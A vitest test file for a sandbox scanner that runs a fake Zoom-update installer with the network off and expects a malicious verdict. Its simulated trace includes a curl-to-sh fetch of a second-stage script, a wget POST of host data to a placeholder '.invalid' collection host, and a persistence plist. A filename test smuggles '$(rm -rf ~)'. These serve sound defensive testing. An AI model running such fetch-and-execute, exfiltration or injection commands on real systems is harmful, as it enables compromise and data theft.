import { describe, expect, it, vi } from 'vitest'
import type { LiveEvent } from '@shared/live'
import type { ScanReport } from '@shared/types'
import {
  SAMPLE_PATH,
  sha256Hex,
  type CreateParams,
  type SandboxClient,
  type SandboxLike
} from './daytona'
import { LiveBus } from './live'
import { scriptedAgent } from './liveAgent'
import {
  desktopOpenCommand,
  fileKind,
  runsAsShell,
  showCommand,
  startSandboxScan,
  type DesktopLike
} from './sandboxScan'
import { FAKE_INSTALLER } from './testSamples'

const b64 = (s: string): string => Buffer.from(s).toString('base64')

/** What the fake installer's run prints through observeCommand. */
const OBSERVED = [
  '@@exit',
  b64('0\n'),
  '@@stdout',
  b64('Installing Zoom update 6.4.1...\nUpdate complete.\n'),
  '@@stderr',
  b64(
    '+ echo Installing Zoom update 6.4.1...\n' +
      '+ curl -fsSL https://updates.zoom-support.invalid/stage2.sh\n+ sh\n' +
      '+ mkdir -p /tmp/aegis-run/home/Library/LaunchAgents\n' +
      '+ wget -q -T 5 --tries=1 -O /dev/null --post-data host=x https://collect.zoom-support.invalid/upload\n'
  ),
  '@@files',
  b64('home/Library/LaunchAgents/us.zoom.updater.plist\n'),
  ''
].join('\n')

interface FakeOptions {
  desktop?: boolean
  networkOn?: boolean
  /** What the side reads of the running file's stderr return, once. */
  streamed?: string
}

function fakeSandbox(
  opts: FakeOptions = {}
): SandboxLike & Partial<DesktopLike> & { commands: string[] } {
  const files = new Map<string, Buffer>()
  const commands: string[] = []
  let streamedOnce = false
  const sandbox: SandboxLike & Partial<DesktopLike> & { commands: string[] } = {
    id: 'sbx-12345678',
    networkBlockAll: true,
    commands,
    fs: {
      createFolder: vi.fn(async () => undefined),
      uploadFile: vi.fn(async (file: Buffer, path: string) => {
        files.set(path, file)
      })
    },
    process: {
      executeCommand: vi.fn(async (cmd: string) => {
        commands.push(cmd)
        const sample = files.get(SAMPLE_PATH) ?? Buffer.alloc(0)
        if (cmd.startsWith('sha256sum '))
          return { exitCode: 0, result: `${sha256Hex(sample)}  ${SAMPLE_PATH}\n` }
        if (cmd.includes('REACHED')) {
          return {
            exitCode: 0,
            result: opts.networkOn ? 'REACHED curl https://example.com\n' : 'BLOCKED\n'
          }
        }
        if (cmd.includes('sh -x /tmp/aegis-run/sample.sh')) return { exitCode: 0, result: OBSERVED }
        if (
          cmd.startsWith('tail -c +1 /tmp/aegis-run/out/stderr') &&
          opts.streamed &&
          !streamedOnce
        ) {
          streamedOnce = true
          return { exitCode: 0, result: b64(opts.streamed) }
        }
        if (cmd.startsWith('tail -c')) return { exitCode: 0, result: '' }
        if (cmd === 'ls -la sample') return { exitCode: 0, result: 'file\nmeta.json\n' }
        if (cmd.startsWith('wc -c')) {
          return { exitCode: 0, result: `${sample.length}\n${sha256Hex(sample)}  ${SAMPLE_PATH}\n` }
        }
        if (cmd.startsWith('head -c')) return { exitCode: 0, result: sample.toString('utf8') }
        return { exitCode: 0, result: '' }
      })
    },
    delete: vi.fn(async () => undefined)
  }
  if (opts.desktop !== false) {
    sandbox.computerUse = {
      start: vi.fn(async () => ({ message: 'started' })),
      screenshot: { takeCompressed: vi.fn(async () => ({ screenshot: b64('jpeg-bytes') })) }
    }
  }
  return sandbox
}

interface Setup {
  events: LiveEvent[]
  reports: ScanReport[]
  active: number[]
  calls: CreateParams[]
  bus: LiveBus
  start: () => ReturnType<typeof startSandboxScan>
}

function setup(sandbox: SandboxLike, over: { createFails?: boolean } = {}): Setup {
  const events: LiveEvent[] = []
  const reports: ScanReport[] = []
  const active: number[] = []
  const calls: CreateParams[] = []
  const client: SandboxClient = {
    create: vi.fn(async (params: CreateParams) => {
      calls.push(params)
      if (over.createFails) throw new Error('Daytona is down')
      return sandbox
    })
  }
  const bus = new LiveBus((_id, e) => events.push(e))
  const start = (): ReturnType<typeof startSandboxScan> =>
    startSandboxScan(
      {
        client: async () => client,
        bus,
        agent: scriptedAgent({ paceMs: 0 }),
        putScan: (r) => reports.push(r),
        log: () => undefined,
        active: (d) => active.push(d),
        frameEveryMs: 5,
        traceEveryMs: 5,
        desktopDwellMs: 0
      },
      {
        bytes: Buffer.from(FAKE_INSTALLER),
        filename: 'zoom-update.sh',
        url: null,
        referrer: null,
        contentType: 'text/x-shellscript',
        source: 'chrome',
        seenIn: 'Sandbox test'
      }
    )
  return { events, reports, active, calls, bus, start }
}

const stages = (events: LiveEvent[]): string[] =>
  events.flatMap((e) => (e.kind === 'stage' ? [`${e.stage}:${e.state}`] : []))

describe('startSandboxScan', () => {
  it('puts the scan in the store at once, then opens, reviews and reports it', async () => {
    const sandbox = fakeSandbox()
    const t = setup(sandbox)
    const { scanId, done } = t.start()
    expect(t.reports[0]).toMatchObject({ id: scanId, action: 'scanning', status: 'received' })
    expect(t.bus.get(scanId)?.agent.mode).toBe('scripted')

    const report = await done
    expect(t.calls[0]).toMatchObject({ networkBlockAll: true, ephemeral: true })
    expect(stages(t.events)).toEqual([
      'caught:done',
      'sandbox:active',
      'sandbox:done',
      'opened:active',
      'opened:done',
      'agent:active',
      'agent:done',
      'verdict:done'
    ])
    expect(report).toMatchObject({
      status: 'done',
      verdict: 'malicious',
      action: 'quarantined',
      fileKind: 'Shell script',
      partial: false
    })
    expect(report.droid?.reviewer).toBe('scripted')
    expect(report.checks.find((c) => c.name === 'Agent review')).toMatchObject({
      state: 'warn',
      result: 'scripted stand-in'
    })
    expect(report.sandbox[0]).toMatchObject({
      provider: 'daytona',
      sandboxId: 'sbx-12345678',
      network: 'off'
    })
    expect(report.sandbox[0].destroyedAt).not.toBeNull()
    expect(t.reports[t.reports.length - 1]).toBe(report)
    expect(sandbox.delete).toHaveBeenCalledOnce()
    expect(t.active).toEqual([1, -1])
    expect(t.events[t.events.length - 1]).toMatchObject({
      kind: 'end',
      ok: true,
      verdict: 'malicious',
      sandboxDeleted: true
    })
  })

  it('shows the desktop, opens the file there in a terminal, and sends pictures', async () => {
    const sandbox = fakeSandbox()
    const t = setup(sandbox)
    const { scanId, done } = t.start()
    await done
    const desktop = t.events
      .filter((e) => e.kind === 'desktop')
      .map((e) => (e.kind === 'desktop' ? e.state : ''))
    expect(desktop).toEqual(['starting', 'on'])
    expect(sandbox.commands.some((c) => c.includes('xfce4-terminal'))).toBe(true)
    // Pictures go to the windows, but only the latest is kept, outside the event list.
    expect(t.events.some((e) => e.kind === 'frame')).toBe(true)
    expect(t.bus.get(scanId)?.frame?.jpeg).toBe(b64('jpeg-bytes'))
    expect(t.bus.get(scanId)?.events.some((e) => e.kind === 'frame')).toBe(false)
  })

  it('streams the trace while the file runs, marking network attempts as blocked', async () => {
    const t = setup(fakeSandbox({ streamed: '+ echo hi\n+ curl -fsSL https://x.invalid/a.sh\n' }))
    await t.start().done
    const sample = t.events.flatMap((e) =>
      e.kind === 'term' && e.source === 'sample' ? [`${e.stream} ${e.text}`] : []
    )
    expect(sample).toContain('cmd echo hi')
    expect(sample).toContain('blocked curl -fsSL https://x.invalid/a.sh')
    // The side reads worked, so the recorded trace isn't printed a second time.
    expect(sample.filter((l) => l === 'cmd echo hi')).toHaveLength(1)
  })

  it('falls back to the recorded trace when the side reads see nothing', async () => {
    const t = setup(fakeSandbox())
    await t.start().done
    const sample = t.events.flatMap((e) =>
      e.kind === 'term' && e.source === 'sample' ? [`${e.stream} ${e.text}`] : []
    )
    expect(sample).toContain('blocked curl -fsSL https://updates.zoom-support.invalid/stage2.sh')
    expect(sample).toContain('file home/Library/LaunchAgents/us.zoom.updater.plist')
  })

  it('still reaches a verdict without a desktop', async () => {
    const t = setup(fakeSandbox({ desktop: false }))
    const report = await t.start().done
    expect(report.verdict).toBe('malicious')
    expect(report.checks.find((c) => c.name === 'Sandbox desktop')?.state).toBe('skipped')
    expect(t.events.find((e) => e.kind === 'desktop')).toMatchObject({ state: 'off' })
  })

  it('never opens the file when the network turns out to be on', async () => {
    const sandbox = fakeSandbox({ networkOn: true })
    const t = setup(sandbox)
    const report = await t.start().done
    expect(sandbox.commands.some((c) => c.includes('sh -x /tmp/aegis-run/sample.sh'))).toBe(false)
    expect(report).toMatchObject({ status: 'failed', verdict: 'unknown', action: 'held' })
    expect(report.summary).toMatch(/could reach the network/)
    expect(stages(t.events)).toContain('sandbox:failed')
    expect(sandbox.delete).toHaveBeenCalledOnce()
  })

  it('reports Unknown, never Clean, when no sandbox can be made', async () => {
    const t = setup(fakeSandbox(), { createFails: true })
    const report = await t.start().done
    expect(report).toMatchObject({ status: 'failed', verdict: 'unknown' })
    expect(t.events[t.events.length - 1]).toMatchObject({ kind: 'end', ok: false })
    expect(t.active).toEqual([1, -1])
  })
})

describe('desktopOpenCommand', () => {
  it("shows the recorded run in a terminal titled with a name the shell can't misread", () => {
    const cmd = desktopOpenCommand(`it's "$(rm -rf ~)".command`)
    expect(cmd).toContain("--title='it_s ___rm -rf ___.command'")
    expect(cmd).toContain('setsid -f xfce4-terminal --disable-server --hold')
    expect(cmd).toContain('tail -q -n +1 -F /tmp/aegis-run/out/stdout /tmp/aegis-run/out/stderr')
  })
})

describe('fileKind', () => {
  it('names the kinds a person would recognise', () => {
    expect(fileKind('ZoomUpdate.command')).toBe('Shell script')
    expect(fileKind('Installer.pkg')).toBe('Installer')
    expect(fileKind('notes')).toBe('File')
  })
})

describe('runsAsShell', () => {
  it('runs shell scripts by name or by their #! line, and nothing else', () => {
    const none = Buffer.from('')
    expect(runsAsShell('zoom-update.sh', none)).toBe(true)
    expect(runsAsShell('ZoomUpdate.command', none)).toBe(true)
    expect(runsAsShell('install', Buffer.from('#!/bin/bash\necho hi\n'))).toBe(true)
    expect(runsAsShell('install', Buffer.from('#!/usr/bin/env zsh\n'))).toBe(true)
    expect(runsAsShell('tool.py', Buffer.from('#!/usr/bin/env python3\n'))).toBe(false)
    expect(runsAsShell('statement.pdf', Buffer.from('%PDF-1.7\n'))).toBe(false)
    expect(runsAsShell('setup.exe', Buffer.from('MZ'))).toBe(false)
  })
})

describe('showCommand', () => {
  it('reads the sample into the output the desktop window tails, without running it', () => {
    const cmd = showCommand()
    expect(cmd).toContain('file -b sample/file')
    expect(cmd).toContain('>/tmp/aegis-run/out/stdout')
    expect(cmd).toContain('touch /tmp/aegis-run/out/marker')
    expect(cmd).not.toMatch(/sh -x|chmod|\.\/sample/)
  })
})
